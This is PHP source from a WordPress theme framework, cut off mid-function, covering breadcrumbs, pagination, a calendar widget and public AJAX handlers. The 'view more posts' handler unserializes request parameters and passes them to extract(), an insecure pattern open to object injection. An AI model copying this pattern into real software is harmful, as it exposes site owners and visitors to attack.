<?php
/**
 * Axiom Welldone Framework: WordPress utilities
 *
 * @package	axiom_welldone
 * @since	axiom_welldone 1.0
 */

// Disable direct call
if ( ! defined( 'ABSPATH' ) ) { exit; }


// Theme init
if (!function_exists('axiom_welldone_wp_theme_setup')) {
	add_action( 'axiom_welldone_action_before_init_theme', 'axiom_welldone_wp_theme_setup' );
	function axiom_welldone_wp_theme_setup() {

		// Pre query: Add posts per page value into wp query
		add_action( 'pre_get_posts', 						'axiom_welldone_query_add_posts_per_page' );

		// Pre query: Add filter to main query
		add_filter('posts_where', 							'axiom_welldone_query_posts_where', 10, 2);  

		// Get theme calendar (instead standard WP calendar) to support Events
		add_filter( 'get_calendar',							'axiom_welldone_get_calendar' );

		// Filter categories list - exclude unwanted cats from widget output
		add_action('widget_categories_args',				'axiom_welldone_query_exclude_categories');
		add_action('widget_categories_dropdown_args',		'axiom_welldone_query_exclude_categories');
		add_action('getarchives_where',						'axiom_welldone_query_exclude_archives_where', 10, 2);
		add_action('widget_posts_args',						'axiom_welldone_query_exclude_posts' );

		// AJAX: Get next page on blog streampage
		add_action('wp_ajax_view_more_posts', 				'axiom_welldone_callback_view_more_posts');
		add_action('wp_ajax_nopriv_view_more_posts',		'axiom_welldone_callback_view_more_posts');

		// AJAX: Incremental search
		add_action('wp_ajax_ajax_search',					'axiom_welldone_callback_ajax_search');
		add_action('wp_ajax_nopriv_ajax_search',			'axiom_welldone_callback_ajax_search');

		// AJAX: Change month in the calendar widget
		add_action('wp_ajax_calendar_change_month',			'axiom_welldone_callback_calendar_change_month');
		add_action('wp_ajax_nopriv_calendar_change_month',	'axiom_welldone_callback_calendar_change_month');

		// AJAX: Set post likes/views count
		add_action('wp_ajax_post_counter', 					'axiom_welldone_callback_post_counter');
		add_action('wp_ajax_nopriv_post_counter', 			'axiom_welldone_callback_post_counter');

		// Add categories (taxonomies) filter for custom posts types
		add_action( 'restrict_manage_posts', 				'axiom_welldone_show_taxonomies_filters' );

		// Clear taxonomies cache when save or delete post or category
		add_action( 'save_post', 							'axiom_welldone_clear_all_terms_filters', 10, 2 );
		add_action( 'delete_post', 							'axiom_welldone_clear_all_terms_filters', 10, 2 );
		add_action( 'edit_category', 						'axiom_welldone_clear_categories_filters',   10, 1 );
		add_action( 'create_category', 						'axiom_welldone_clear_categories_filters', 10, 1 );
		add_action( 'delete_category', 						'axiom_welldone_clear_categories_filters', 10, 1 );
	}
}



/* Blog tags
------------------------------------------------------------------------------------- */

// Return blog records type
if (!function_exists('axiom_welldone_get_blog_type')) {
	function axiom_welldone_get_blog_type($query=null) {
		global $wp_query;
		static $page='';
		if (!empty($page)) return $page;
		if ( $query===null ) $query = $wp_query;
		$page = apply_filters('axiom_welldone_filter_get_blog_type', $page, $query);
		return $page;
	}
}

// Return blog title
if (!function_exists('axiom_welldone_get_blog_title')) {
	function axiom_welldone_get_blog_title() {
		global $wp_query;
		static $title='';
		if (!empty($title)) return $title;
		$page  = axiom_welldone_get_blog_type();
		$title = apply_filters('axiom_welldone_filter_get_blog_title', $title, $page);
		return $title;
	}
}

// Show breadcrumbs path
if (!function_exists('axiom_welldone_show_breadcrumbs')) {
	function axiom_welldone_show_breadcrumbs($args=array()) {
		global $wp_query, $post;
		
		axiom_welldone_storage_set('in_breadcrumbs', true);
		
		$args = array_merge( array(
			'home' => esc_html__('Home', 'axiom-welldone'),		// Home page title (if empty - not showed)
			'home_url' => '',						// Home page url
			'show_all_filters' => true,				// Add "All photos" (All videos) before categories list
			'show_all_posts' => true,				// Add "All posts" at start 
			'truncate_title' => 50,					// Truncate all titles to this length (if 0 - no truncate)
			'truncate_add' => '...',				// Append truncated title with this string
			'delimiter' => '<span class="breadcrumbs_delimiter"></span>',			// Delimiter between breadcrumbs items
			'max_levels' => axiom_welldone_get_theme_option('breadcrumbs_max_level'),		// Max categories in the path (0 - unlimited)
			'echo' => true							// If true - show on page, else - only return value
			), is_array($args) ? $args : array( 'home' => $args )
		);

		$type = axiom_welldone_get_blog_type();
		$title = axiom_welldone_strshort(axiom_welldone_get_blog_title(), $args['truncate_title'], $args['truncate_add']);

		if ( in_array($type, array('home', 'frontpage')) ) return '';

		if ( $args['max_levels']<=0 ) $args['max_levels'] = 999;

		$need_reset = true;
		$rez = $rez_parent = $rez_all = $rez_level = $rez_period = '';
		$cat = $parentTax = '';
		$level = $parent = $post_id = 0;

		// Get current post ID and path to current post/page/attachment ( if it have parent posts/pages )
		if ($type == 'page' || $type == 'attachment' || is_single()) {
			$pageParentID = isset($wp_query->post->post_parent) ? $wp_query->post->post_parent : 0;
			$post_id = ($type == 'attachment' ? $pageParentID : (isset($wp_query->post->ID) ? $wp_query->post->ID : 0));
			while ($pageParentID > 0) {
				$pageParent = get_post($pageParentID);
				$level++;
				if ($level > $args['max_levels'])
					$rez_level = '...';
				else
					$rez_parent = '<a class="breadcrumbs_item cat_post" href="' . get_permalink($pageParent->ID) . '">' 
									. trim(axiom_welldone_strshort($pageParent->post_title, $args['truncate_title'], $args['truncate_add']))
									. '</a>' 
									. (!empty($rez_parent) ? $args['delimiter'] : '') 
									. ($rez_parent);
				if (($pageParentID = $pageParent->post_parent) > 0) $post_id = $pageParentID;
			}
		}
		
		$depth = 0;

		$taxonomy = apply_filters('axiom_welldone_filter_get_current_taxonomy', '', $type);
		$ex_cats = $taxonomy == 'category' ? explode(',', axiom_welldone_get_theme_option('exclude_cats')) : array();
		
		do {
			if ($depth++ == 0) {
				if (is_single() || is_attachment()) {
					if ($args['show_all_filters']) {
						$post_format = get_post_format($post_id);
						if (($tpl_id = axiom_welldone_get_template_page_id('only-'.($post_format))) > 0) {
							$level++;
							if ($level > $args['max_levels'])
								$rez_level = '...';
							else
								$rez_all .= (!empty($rez_all) ? $args['delimiter'] : '') 
										. '<a class="breadcrumbs_item all" href="' . get_permalink($tpl_id) . '">' 
											. sprintf(esc_html__('All %s', 'axiom-welldone'), axiom_welldone_get_post_format_name($post_format, false)) 
										. '</a>';
						}
					}
					$cats = axiom_welldone_get_terms_by_post_id( array(
						'post_id'  => $post_id, 
						'taxonomy' => $taxonomy,
						'exclude'  => $ex_cats
						)
					);
					$cat = !empty($cats) && !empty($cats[$taxonomy]->terms) ? $cats[$taxonomy]->terms[0] : false;
					if ($cat) {
						$level++;
						if ($level > $args['max_levels'])
							$rez_level = '...';
						else
							$rez_parent = '<a class="breadcrumbs_item cat_post" href="'.esc_url($cat->link).'">' 
											. trim(axiom_welldone_strshort($cat->name, $args['truncate_title'], $args['truncate_add']))
											. '</a>' 
											. (!empty($rez_parent) ? $args['delimiter'] : '') 
											. ($rez_parent);
					}
				} else if ( $type == 'category' ) {
					$cat_id = (int) get_query_var( 'cat' );
					if (empty($cat_id)) $cat_id = get_query_var( 'category_name' );
					$cat = get_term_by( (int) $cat_id > 0 ? 'id' : 'slug', $cat_id, 'category', OBJECT);
				} else if ( ($tax = axiom_welldone_is_taxonomy()) != '' ) {
					$cat = get_term_by( 'slug', get_query_var( $tax ), $tax, OBJECT);
				}
				if ($cat) {
					$parent = $cat->parent;
					$parentTax = $cat->taxonomy;
				}
			}
			if ($parent) {
				$cat = get_term_by( 'id', $parent, $parentTax, OBJECT);
				if ($cat) {
					if (!in_array($cat->term_id, $ex_cats)) {
						$cat_link = get_term_link($cat->slug, $cat->taxonomy);
						$level++;
						if ($level > $args['max_levels'])
							$rez_level = '...';
						else
							$rez_parent = '<a class="breadcrumbs_item cat_parent" href="'.esc_url($cat_link).'">' 
											. trim(axiom_welldone_strshort($cat->name, $args['truncate_title'], $args['truncate_add']))
											. '</a>' 
											. (!empty($rez_parent) ? $args['delimiter'] : '') 
											. ($rez_parent);
					}
					$parent = $cat->parent;
				}
			}
		} while ($parent);

		if ($args['show_all_posts']) {
			$all_title = axiom_welldone_get_stream_page_title($type);
			$all_parts = explode(':', $all_title);
			if (count($all_parts) > 1)
				$all_title = trim($all_parts[1]);
			if ( $all_title && axiom_welldone_strtolower($title) != axiom_welldone_strtolower($all_title)) {
				$all_link = axiom_welldone_get_stream_page_link($type);
				if (!empty($all_link))
					$rez_all = '<a class="breadcrumbs_item all" href="' . esc_url($all_link) . '">' . ($all_title) . '</a>' . (!empty($rez_all) ? $args['delimiter'] : '') . ($rez_all);
			}
		}

		$rez_period = apply_filters('axiom_welldone_filter_get_period_links', '', $type, $args['delimiter']);

		if (!is_front_page()) {	// && !is_home()
			$rez .= (isset($args['home']) && $args['home']!='' ? '<a class="breadcrumbs_item home" href="' . esc_url($args['home_url'] ? $args['home_url'] : home_url('/')) . '">' . ($args['home']) . '</a>' . ($args['delimiter']) : '') 
				. (!empty($rez_all)    ? ($rez_all)    . ($args['delimiter']) : '')
				. (!empty($rez_level)  ? ($rez_level)  . ($args['delimiter']) : '')
				. (!empty($rez_parent) ? ($rez_parent) . ($args['delimiter']) : '')
				. (!empty($rez_period) ? ($rez_period) . ($args['delimiter']) : '')
				. ($title ? '<span class="breadcrumbs_item current">' . ($title) . '</span>' : '');
		}

		if ($args['echo'] && !empty($rez)) axiom_welldone_show_layout($rez);

		axiom_welldone_storage_set('in_breadcrumbs', false);

		return $rez;
	}
}

// Show pages links below list or single page
if (!function_exists('axiom_welldone_show_pagination')) {
	function axiom_welldone_show_pagination($args=array()) {
		$args = array_merge(array(
			'offset' => 0,				// Offset to first showed record
			'id' => 'pagination',		// 'id' attribute
			'class' => 'pagination',	// 'class' attribute
			'button_class' => 'theme_button',		// 'class' attribute for each page button
			'style' => 'pages',
			'show_pages' => 5,
			'pages_in_group' => 10,
			'pages_text' => '', 		//esc_html__('Page %CURRENT_PAGE% of %TOTAL_PAGES%', 'axiom-welldone'),
			'current_text' => "%PAGE_NUMBER%",
			'page_text' => "%PAGE_NUMBER%",
			'first_text'=> esc_html__('&laquo; First', 'axiom-welldone'),
			'last_text' => esc_html__("Last &raquo;", 'axiom-welldone'),
			'prev_text' => esc_html__("&laquo; Prev", 'axiom-welldone'),
			'next_text' => esc_html__("Next &raquo;", 'axiom-welldone'),
			'dot_text' => "&hellip;",
			'before' => '',
			'after' => '',
			),  is_array($args) ? $args 
				: (is_int($args) ? array( 'offset' => $args ) 		// If send number parameter - use it as offset
					: array( 'id' => $args, 'class' => $args )));	// If send string parameter - use it as 'id' and 'class' name
		if (empty($args['before']))	$args['before'] = '<nav id="'.esc_attr($args['id']).'" class="'.esc_attr($args['class']).'">';
		if (empty($args['after'])) 	$args['after'] = '</nav>';
		if (!is_single()) {
			axiom_welldone_show_pagination_blog($args);
		} else {
			axiom_welldone_show_pagination_single($args);
		}
	}
}

// Single page navigation
if (!function_exists('axiom_welldone_show_pagination_single')) {
	function axiom_welldone_show_pagination_single( $args ) {
		global $wp_query, $post;
		// Don't print empty markup on single pages if there's nowhere to navigate.
		if ( is_single() ) {
			$previous = ( is_attachment() ) ? get_post( $post->post_parent ) : get_adjacent_post( false, '', true );
			$next = get_adjacent_post( false, '', false );
			if ( ! $next && ! $previous )
				return;
		}
		// Don't print empty markup in archives if there's only one page.
		if ( $wp_query->max_num_pages < 2 && ( is_home() || is_archive() || is_search() ) )
			return;
		axiom_welldone_show_layout($args['before']);
		if ( is_single() ) {
			?>
			<h3 class="screen-reader-text"><?php esc_html_e( 'Post navigation', 'axiom-welldone' ); ?></h3>
			<?php
			// navigation links for single posts
			previous_post_link( '<div class="pager_prev '.esc_attr($args['button_class']).'">%link</div>', '<span class="pager_nav">' . ($args['prev_text']) . '</span> %title' );
			next_post_link( '<div class="pager_next '.esc_attr($args['button_class']).'">%link</div>', '%title <span class="pager_nav">' . ($args['next_text']) . '</span>' );
		} else if ( $wp_query->max_num_pages > 1 && ( is_home() || is_archive() || is_search() ) ) {	// navigation links for home, archive, and search pages
			if ( get_previous_posts_link() ) {
				?><div class="pager_prev <?php echo esc_attr($args['button_class']); ?>"><?php previous_posts_link( $args['prev_text'] ); ?></div><?php
			}
			if ( get_next_posts_link() ) {
				?><div class="pager_next <?php echo esc_attr($args['button_class']); ?>"><?php next_posts_link( $args['next_text'] ); ?></div><?php
			}
		}
		axiom_welldone_show_layout($args['after']);
	}
}

// Blog pagination
if (!function_exists('axiom_welldone_show_pagination_blog')) {
	function axiom_welldone_show_pagination_blog($opt) {
		global $wp_query;
	
		$output = '';
		
		if (!is_single()) {
			$num_posts = $wp_query->found_posts - ($opt['offset'] > 0 ? $opt['offset'] : 0);
			$posts_per_page = intval(get_query_var('posts_per_page'));
			$cur_page = intval(get_query_var('paged'));
			if ($cur_page==0) $cur_page = intval(get_query_var('page'));
			if (empty($cur_page) || $cur_page == 0) $cur_page = 1;
			$show_pages = $opt['show_pages'] > 0 ? $opt['show_pages'] : $opt['pages_in_group'];
			$show_pages_start = $cur_page - floor($show_pages/2);
			$show_pages_end = $show_pages_start + $show_pages - 1;
			$max_page = ceil($num_posts / $posts_per_page);
			$cur_group = ceil($cur_page / $opt['pages_in_group']);
	
			if ($max_page > 1) {
	
				$output .= $opt['before'];
	
				if ($opt['style'] == 'pages') {
					// Page XX from XXX
					if ($opt['pages_text']) {
						$pages_text = str_replace("%CURRENT_PAGE%", number_format_i18n($cur_page), $opt['pages_text']);
						$pages_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $pages_text);
						$output .= '<span class="pager_pages '.esc_attr($opt['button_class']).'">' . ($pages_text) . '</span>';
					}
					if ($cur_page > 1) {
						// First page
						$page_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $opt['first_text']);
						$output .= '<a href="'.esc_url(get_pagenum_link()).'" class="pager_first '.esc_attr($opt['button_class']).'">'.($page_text).'</a>';
						// Prev page
						$output .= '<a href="'.esc_url(get_pagenum_link($cur_page-1)).'" class="pager_prev '.esc_attr($opt['button_class']).'">'.($opt['prev_text']).'</a>';
					}
					// Page buttons
					$group = 1;
					$dot1 = $dot2 = false;
					for ($i = 1; $i <= $max_page; $i++) {
						if ($i % $opt['pages_in_group'] == 1) {
							$group = ceil($i / $opt['pages_in_group']);
							if ($group != $cur_group)
								$output .= '<a href="'.esc_url(get_pagenum_link($i)).'" class="pager_group '.esc_attr($opt['button_class']).'">'.($i).'-'.min($i+$opt['pages_in_group']-1, $max_page).'</a>';
						}
						if ($group == $cur_group) {
							if ($i < $show_pages_start) {
								if (!$dot1) {
									$output .= '<a href="'.esc_url(get_pagenum_link($show_pages_start-1)).'" class="pager_dot '.esc_attr($opt['button_class']).'">'.($opt['dot_text']).'</a>';
									$dot1 = true;
								}
							} else if ($i > $show_pages_end) {
								if (!$dot2) {
									$output .= '<a href="'.esc_url(get_pagenum_link($show_pages_end+1)).'" class="pager_dot '.esc_attr($opt['button_class']).'">'.($opt['dot_text']).'</a>';
									$dot2 = true;
								}
							} else if ($i == $cur_page) {
								$page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $opt['current_text']);
								$output .= '<span class="pager_current active '.esc_attr($opt['button_class']).'">'.($page_text).'</span>';
							} else {
								$page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $opt['page_text']);
								$output .= '<a href="'.esc_url(get_pagenum_link($i)).'" class="'.esc_attr($opt['button_class']).'">'.($page_text).'</a>';
							}
						}
					}
					if ($cur_page < $max_page) {
						// Next page
						$output .= '<a href="'.esc_url(get_pagenum_link($cur_page+1)).'" class="pager_next '.esc_attr($opt['button_class']).'">'.($opt['next_text']).'</a>';
						// Last page
						$page_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $opt['last_text']);
						$output .= '<a href="'.esc_url(get_pagenum_link($max_page)).'" class="pager_last '.esc_attr($opt['button_class']).'">'.($page_text).'</a>';
					}
	
				} else if ($opt['style'] == 'slider') {
					
					// Enqueue swiper scripts and styles
					axiom_welldone_enqueue_slider();
	
					if ($cur_page > 1) {
						// First page
						$page_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $opt['first_text']);
						$page_text = str_replace("&laquo;", '', $page_text);
						$output .= '<a href="'.esc_url(get_pagenum_link()).'" class="pager_first '.esc_attr($opt['button_class']).'">'.($page_text).'</a>';
						// Prev page
						$page_text = str_replace("&laquo;", '', $opt['prev_text']);
						$output .= '<a href="'.esc_url(get_pagenum_link($cur_page-1)).'" class="pager_prev '.esc_attr($opt['button_class']).'">'.($page_text).'</a>';
					}
					// Page XX from XXX
					if (empty($opt['pages_text'])) 
						$opt['pages_text'] = esc_html__('Page %CURRENT_PAGE% of %TOTAL_PAGES%', 'axiom-welldone');
					$pages_text = str_replace("%CURRENT_PAGE%", '<input class="pager_cur" readonly="readonly" type="text" size="1" value="'.esc_attr($cur_page).'">', $opt['pages_text']);
					$pages_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $pages_text);
					$output .= '<div class="pager_pages">' . ($pages_text);
					// Page buttons
					$output .= '<div class="pager_slider">'
						. '<div class="sc_slider sc_slider_swiper sc_slider_controls sc_slider_controls_top sc_slider_nopagination sc_slider_noautoplay swiper-slider-container">'
						. '<div class="slides swiper-wrapper" data-current-slide="'.esc_attr($cur_group).'">';
					$group = 1;
					$row_opened = false;
					for ($i = 1; $i <= $max_page; $i++) {
						if ($i % $opt['pages_in_group'] == 1) {
							$group = ceil($i / $opt['pages_in_group']);
							$output .= ($i > 1 ? '</tr></table></div></div>' : '') . '<div class="swiper-slide"><div class="pager_numbers"><table>';
							$row_opened = false;
						}
						if ($i % $opt['show_pages'] == 1) {
							if ($row_opened)
								$output .= '</tr>';
							$output .= '<tr>';
							$row_opened = true;
						}
						if ($i == $cur_page) {
							$page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $opt['current_text']);
							$output .= '<td><a href="#" class="active">'.($page_text).'</a></div>';
						} else {
							$page_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $opt['page_text']);
							$output .= '<td><a href="'.esc_url(get_pagenum_link($i)).'">'.($page_text).'</a></td>';
						}
					}
					$output .= '</tr></table></div></div>';
					$output .= '</div>'
						. '<div class="sc_slider_controls_wrap"><a class="sc_slider_prev" href="#"></a><a class="sc_slider_next" href="#"></a></div>'
						. '</div>'
						. '</div>'
						. '</div>';
					if ($cur_page < $max_page) {
						// Next page
						$page_text = str_replace("&raquo;", '', $opt['next_text']);
						$output .= '<a href="'.esc_url(get_pagenum_link($cur_page+1)).'" class="pager_next '.esc_attr($opt['button_class']).'">'.($page_text).'</a>';
						// Last page
						$page_text = str_replace("%TOTAL_PAGES%", number_format_i18n($max_page), $opt['last_text']);
						$page_text = str_replace("&raquo;", '', $page_text);
						$output .= '<a href="'.esc_url(get_pagenum_link($max_page)).'" class="pager_last '.esc_attr($opt['button_class']).'">'.($page_text).'</a>';
					}
	
				}
				$output .= $opt['after'];
			}
		}
		axiom_welldone_show_layout($output);
	}
}


// Get next page on blog streampage (viewmore button callback)
if ( !function_exists( 'axiom_welldone_callback_view_more_posts' ) ) {
	function axiom_welldone_callback_view_more_posts() {
		global $post, $wp_query;
		
		if ( !wp_verify_nonce( axiom_welldone_get_value_gp('nonce'), admin_url('admin-ajax.php') ) )
			die();
	
		$response = array('error'=>'', 'data' => '', 'no_more_data' => 0);
		
		$page = $_REQUEST['page'];
		$args = axiom_welldone_unserialize(stripslashes($_REQUEST['data']));
		$vars = axiom_welldone_unserialize(stripslashes($_REQUEST['vars']));
	
		if ($page > 0 && is_array($args) && is_array($vars)) {
			extract($vars);
			$args['page'] = $page;
			$args['paged'] = $page;
			$args['ignore_sticky_posts'] = 1;
			// Use query_posts() instead new WP_Query because this is a AJAX handler and it die after working
			// (not need to restore main query)
			if (!isset($wp_query))
				$wp_query = new WP_Query( $args );
			else
				query_posts($args);
			$per_page = count($wp_query->posts);
			$response['no_more_data'] = $page>=$wp_query->max_num_pages;
			$post_number = 0;
			$response['data'] = '';
			$flt_ids = array();
			while ( have_posts() ) { the_post(); 
				$post_number++;
				$post_args = array(
					'layout' => $vars['blog_style'],
					'number' => $post_number,
					'add_view_more' => false,
					'posts_on_page' => $per_page,
					'columns_count' => $vars['columns_count'],
					// Get post data
					'content' => axiom_welldone_get_template_property($vars['blog_style'], 'need_content'),
					'terms_list' => !axiom_welldone_param_is_off($vars['filters']) || axiom_welldone_get_template_property($vars['blog_style'], 'need_terms'),
					'strip_teaser' => false,
					'parent_tax_id' => $vars['parent_tax_id'],
					'sidebar' => $vars['show_sidebar'] != 'hide',
					'filters' => $vars['filters'],
					'hover' => $vars['hover'] ? $vars['hover'] : 'square effect_dir',
					'hover_dir' => $vars['hover_dir'] ? $vars['hover_dir'] : 'left_to_right',
					'show' => false
				);
				$post_data = axiom_welldone_get_post_data($post_args);
				$response['data'] .= axiom_welldone_show_post_layout($post_args, $post_data);
				if ($vars['filters']=='tags') {
					if (!empty($post_data['post_terms'][$post_data['post_taxonomy_tags']]->terms) && is_array($post_data['post_terms'][$post_data['post_taxonomy_tags']]->terms)) {
						foreach ($post_data['post_terms'][$post_data['post_taxonomy_tags']]->terms as $tag) {
							$flt_ids[$tag->term_id] = $tag->name;
						}
					}
				}
			}
			$response['filters'] = $flt_ids;
		} else {
			$response['error'] = esc_html__('Wrong query arguments', 'axiom-welldone');
		}
		
		echo json_encode($response);
		die();
	}
}

// Incremental search
if ( !function_exists( 'axiom_welldone_callback_ajax_search' ) ) {
	function axiom_welldone_callback_ajax_search() {
		global $post, $wp_query;

		if ( !wp_verify_nonce( axiom_welldone_get_value_gp('nonce'), admin_url('admin-ajax.php') ) )
			die();

		$response = array('error'=>'', 'data' => '');
		
		$s = $_REQUEST['text'];
	
		if (!empty($s)) {

			$show_types 	= axiom_welldone_get_theme_option('ajax_search_types');
			$show_date 		= axiom_welldone_get_theme_option('ajax_search_posts_date')=='yes' ? 1 : 0;
			$show_image 	= axiom_welldone_get_theme_option('ajax_search_posts_image')=='yes' ? 1 : 0;
			$show_author 	= axiom_welldone_get_theme_option('ajax_search_posts_author')=='yes' ? 1 : 0;
			$show_counters	= axiom_welldone_get_theme_option('ajax_search_posts_counters')=='yes' ? axiom_welldone_get_theme_option('blog_counters') : '';
			$post_rating	= axiom_welldone_storage_get('options_prefix').'_reviews_avg'.(axiom_welldone_get_theme_option('reviews_first')=='author' ? '' : '2');

			$args = array(
				'post_status' => 'publish',
				'orderby' => 'date',
				'order' => 'desc', 
				'posts_per_page' => max(1, min(10, axiom_welldone_get_theme_option('ajax_search_posts_count'))),
				's' => esc_html($s),
				);
			// Filter post types
			if (!empty($show_types)) $args['post_type'] = explode(',', $show_types);
			// Exclude categories
			if (axiom_welldone_strpos($show_types, 'post') !== false) {
				$ex = axiom_welldone_get_theme_option('exclude_cats');
				if (!empty($ex))
					$args['category__not_in'] = explode(',', $ex);
			}

			$args = apply_filters( 'ajax_search_query', $args);	

			$post_number = 0;
			$output = '';

			if (!isset($wp_query))
				$wp_query = new WP_Query( $args );
			else
				query_posts($args);
			while ( have_posts() ) { the_post();
				$post_number++;
				axiom_welldone_template_set_args('widgets-posts', array(
					'post_number' => $post_number,
					'post_rating' => $post_rating,
					'show_date' => $show_date,
					'show_image' => $show_image,
					'show_author' => $show_author,
					'show_counters' => $show_counters
				));
				get_template_part(axiom_welldone_get_file_slug('templates/_parts/widgets-posts.php'));
				$output .= axiom_welldone_storage_get('widgets_posts_output');
			}
			if (empty($output)) {
				$output .= '<article class="post_item">' . esc_html__('Sorry, but nothing matched your search criteria. Please try again with some different keywords.', 'axiom-welldone') . '</article>';
			} else {
				$output .= '<article class="post_item"><a href="#" class="post_more search_more">' . esc_html__('More results &hellip;', 'axiom-welldone') . '</a></article>';
			}
			$response['data'] = $output;
		} else {
			$response['error'] = esc_html__('The query string is empty!', 'axiom-welldone');
		}
		
		echo json_encode($response);
		die();
	}
}


	
/* Page components layouts
------------------------------------------------------------------------------------- */

// Get modified calendar layout
if (!function_exists('axiom_welldone_get_calendar')) {
	function axiom_welldone_get_calendar($onlyFirstLetter = false, $get_month = 0, $get_year = 0, $opt=array()) {
		global $m, $monthnum, $year, $wp_locale;

		if ( isset($_GET['w']) ) $w = ''.intval($_GET['w']);
	
		// week_begins = 0 stands for Sunday
		$week_begins = intval(get_option('start_of_week'));
	
		// Let's figure out when we are
		if ( !empty($get_month) && !empty($get_year) ) {
			$thismonth = ''.zeroise(intval($get_month), 2);
			$thisyear = ''.intval($get_year);
		} else if ( !empty($monthnum) && !empty($year) ) {
			$thismonth = ''.zeroise(intval($monthnum), 2);
			$thisyear = ''.intval($year);
		} elseif ( !empty($w) ) {
			$thisyear = ''.intval(substr($m, 0, 4));
			$thismonth = strtotime("+{$w} weeks", "{$thisyear}-01-01");
		} elseif ( !empty($m) ) {
			$thisyear = ''.intval(substr($m, 0, 4));
			if ( strlen($m) < 6 )
				$thismonth = '01';
			else
				$thismonth = ''.zeroise(intval(substr($m, 4, 2)), 2);
		} else {
			$thisyear = gmdate('Y', current_time('timestamp'));
			$thismonth = gmdate('m', current_time('timestamp'));
		}
		$unixmonth = mktime(0, 0 , 0, $thismonth, 1, $thisyear);
		$last_day = date('t', $unixmonth);
	
		// Post types in array
		$posts_types = explode(',', !empty($opt['post_type']) ? $opt['post_type'] : 'post');
		
		// Translators: Calendar caption: 1: month name, 2: 4-digit year
		$calendar_caption = '%1$s %2$s';
		$calendar_output = '<table id="wp-calendar-'.str_replace('.', '', mt_rand()).'" class="wp-calendar"><thead><tr>';
	
		// Get the previous month and year with at least one post
		$prev = apply_filters('axiom_welldone_filter_calendar_get_prev_month', array(), array(
			'posts_types' => $posts_types,
			'year' => $thisyear,
			'month' => $thismonth,
			'last_day' => $last_day
			)
		);
		$prev_month = !empty($prev) ? $prev['month'] : 0;
		$prev_year = !empty($prev) ? $prev['year'] : 0;
		$calendar_output .= '<th class="month_prev">';
		if ( $prev_year+$prev_month > 0 ) {
			$calendar_output .= '<a href="#" data-type="'.esc_attr(join(',', $posts_types)).'" data-year="' . esc_attr($prev_year) . '" data-month="' . esc_attr($prev_month) . '" title="' . esc_attr( sprintf(esc_html__('View posts for %1$s %2$s', 'axiom-welldone'), $wp_locale->get_month($prev_month), date('Y', mktime(0, 0, 0, $prev_month, 1, $prev_year)))) . '">'
				// Uncomment next row if you need month abbr
				//. '&laquo; ' . ($wp_locale->get_month_abbrev($wp_locale->get_month($prev_month))) 
				. '</a>';
		} else {
			$calendar_output .= '&nbsp;';
		}
		$calendar_output .= '</th>';
		
		// Get days with posts
		$posts = apply_filters('axiom_welldone_filter_calendar_get_curr_month_posts', array(), array(
			'posts_types' => $posts_types,
			'year' => $thisyear,
			'month' => $thismonth,
			'last_day' => $last_day
			)
		);
		if (count($posts) > (!empty($posts['done']) ? 1 : 0)) {
			// Get the current month and year
			$link = apply_filters('axiom_welldone_filter_calendar_get_month_link', '', array(
				'posts_types' => $posts_types,
				'year' => $thisyear,
				'month' => $thismonth,
				'last_day' => $last_day
				)
			);
		} else
			$link = '';
		$calendar_output .= '<th class="month_cur" colspan="5">' . ($link ? '<a href="' . esc_url($link) . '" title="' . esc_attr( sprintf(esc_html__('View posts for %1$s %2$s', 'axiom-welldone'), $wp_locale->get_month($thismonth), date('Y', mktime(0, 0, 0, $thismonth, 1, $thisyear)))) . '">' : '') . sprintf($calendar_caption, $wp_locale->get_month($thismonth), '<span>'.date('Y', $unixmonth).'</span>') . ($link ? '</a>' : '') . '</th>';

		// Get the next month and year with at least one post
		$next = apply_filters('axiom_welldone_filter_calendar_get_next_month', array(), array(
			'posts_types' => $posts_types,
			'year' => $thisyear,
			'month' => $thismonth,
			'last_day' => $last_day
			)
		);
		$next_month = !empty($next) ? $next['month'] : 0;
		$next_year = !empty($next) ? $next['year'] : 0;
		$calendar_output .= '<th class="month_next">';

		if ( $next_year+$next_month > 0 ) {
			$calendar_output .= '<a href="#" data-type="'.esc_attr(join(',', $posts_types)).'" data-year="' . esc_attr($next_year) . '" data-month="' . esc_attr($next_month) . '" title="' . esc_attr( sprintf(esc_html__('View posts for %1$s %2$s', 'axiom-welldone'), $wp_locale->get_month($next_month), date('Y', mktime(0, 0 , 0, $next_month, 1, $next_year))) ) . '">' 
				// Uncomment next row if you need month abbr
				//. ($wp_locale->get_month_abbrev($wp_locale->get_month($next->month))) . ' &raquo;'
				. '</a>';
		} else {
			$calendar_output .= '&nbsp;';
		}
		$calendar_output .= '</th></tr><tr>';
	
		// Show Week days
		$myweek = array();
	
		for ( $wdcount=0; $wdcount<=6; $wdcount++ ) {
			$myweek[] = $wp_locale->get_weekday(($wdcount+$week_begins)%7);
		}
		$onlyFirstLetter = false;
		if (is_array($myweek) && count($myweek) > 0) {
			foreach ($myweek as $wd) {
				$day_name = $onlyFirstLetter ? $wp_locale->get_weekday_initial($wd) : $wp_locale->get_weekday_abbrev($wd);
				$wd = esc_attr($wd);
				$calendar_output .= "<th class=\"weekday\" scope=\"col\" title=\"$wd\">$day_name</th>";
			}
		}
	
		$calendar_output .= '</tr></thead><tbody><tr>';

		// See how much we should pad in the beginning
		$pad = calendar_week_mod(date('w', $unixmonth)-$week_begins);
		if ( $pad != 0 )
			$calendar_output .= '<td colspan="'. esc_attr($pad) .'" class="pad"><span class="day_wrap">&nbsp;</span></td>';

		$daysinmonth = intval(date('t', $unixmonth));
		for ( $day = 1; $day <= $daysinmonth; ++$day ) {
			if ( isset($newrow) && $newrow )
				$calendar_output .= "</tr><tr>";
			$newrow = false;
			if ( $day == gmdate('j', current_time('timestamp')) && $thismonth == gmdate('m', current_time('timestamp')) && $thisyear == gmdate('Y', current_time('timestamp')) )
				$calendar_output .= '<td class="today">';
			else
				$calendar_output .= '<td class="day">';
			if ( !empty($posts[$day]) )
